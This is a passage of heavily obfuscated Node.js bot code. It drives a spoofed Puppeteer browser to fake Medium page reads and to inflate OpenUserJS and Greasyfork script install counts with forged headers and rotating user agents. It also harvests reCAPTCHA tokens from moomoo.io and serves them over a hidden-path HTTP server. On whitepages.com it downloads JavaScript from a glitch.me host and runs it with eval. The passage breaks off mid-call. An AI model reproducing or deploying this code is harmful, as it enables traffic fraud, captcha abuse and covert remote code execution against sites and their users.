      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + Z(0x14) + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + Z(0x1d) + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + Z(0xd) + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + Y(0x18, 'gpHe') + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x144 * -0x1e + 0xca1 * -0x1 + 0x1f3 * -0xd
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    const a1 = c;
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x2104 + -0x1 * 0x8d3 + -0x1831)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])[a1(0x11) + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x1a46 + -0x7b * 0x33 + -0x1 * -0x332b), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x13 * 0x2a + 0x22d * 0x9 + 0x164f * -0x1), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x2eb + 0x213d + 0x1e52 * -0x1;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0xf95 + -0xc59 * 0x1 + 0x9 * -0x5c; w < getRandomInt(-0x770 + 0xae1 + 0x37 * -0x10, 0x9a7 + -0x20 * 0x11a + 0x199e); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x3f * -0x4c5 + 0x1a820 + 0x3 * -0xa369);
        }
      }();
    }, 0x3a * 0x71 + 0x1e5e + -0x3794), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0xb * -0x257 + -0x2 * 0x1b6 + 0x1d29;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x557 + 0xddf + -0x888, 0x1 * 0x47f + 0x1 * 0x187d + 0x2e1 * -0xa)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x7743 + 0x363f + -0x3852);
    }, -0xec4 + -0xb7 * -0x2e + -0x11ba), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x5dc + -0x5 * 0x6bf + 0x2797;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x206d * 0x1 + 0x1067 + 0x1bbe), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x1534 + 0x2 * 0x1387 + -0x392 * 0x5), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x138c7e + -0x5df7f + 0xea1);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0xb * 0x265 + 0x15 * -0x12b + -0x51 * -0xa2);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x4 * -0x7de + -0x1f4d + 0x3f8d);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x1 * 0x2345 + 0x3a62 + 0x873);
}
doFlags['doOUJS'] && ((async () => {
  const a4 = c;
  async function f() {
    const a3 = c,
      a2 = d,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0xe9 * -0x1 + -0xc5 * 0x28 + 0x2 * 0xfd9) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x182b + -0x1d60 + 0x358c));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x46e + 0x3 * -0x599 + -0x1 * -0x1539, D['indexOf']('\x20'));
        return B ? E['slice'](-0x1683 + -0x2623 + 0x3ca6, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x2347 * -0x1 + -0x76e * -0x1 + 0x3a5 * -0x1),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': a2(0xe),
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x4779 + -0x1380 + 0x8209),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': a3(0x4),
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + a4(0x5) + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x1924 * -0x1 + -0xa2f + -0x2353 * -0x1; k < 0x125b + 0x22e + -0x1485; k++)
    setTimeout(f, (-0x5dbc + 0x19 * 0xf19 + -0x3155) * k * getRandomInt(-0x20a5 + -0x1 * -0x42d + 0x1c79, 0x4da + -0x24fb + 0x2024));
  setInterval(() => {
    f();
    for (let l = 0x8 * 0x380 + -0x270 + -0x1990; l < -0x1 * 0x1fd3 + -0xa * -0x36e + -0x11 * 0x25; l++)
      setTimeout(f, (-0x3f * 0x69d + -0xdc * -0x1b7 + 0x111bf) * l * getRandomInt(0xa52 + -0x1a21 + -0x3f4 * -0x4, -0x1701 + -0x182 + -0x1886 * -0x1));
  }, -0x3d7f9 * -0x3 + 0xc32de * -0x8 + 0x1 * 0x8cfd85);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
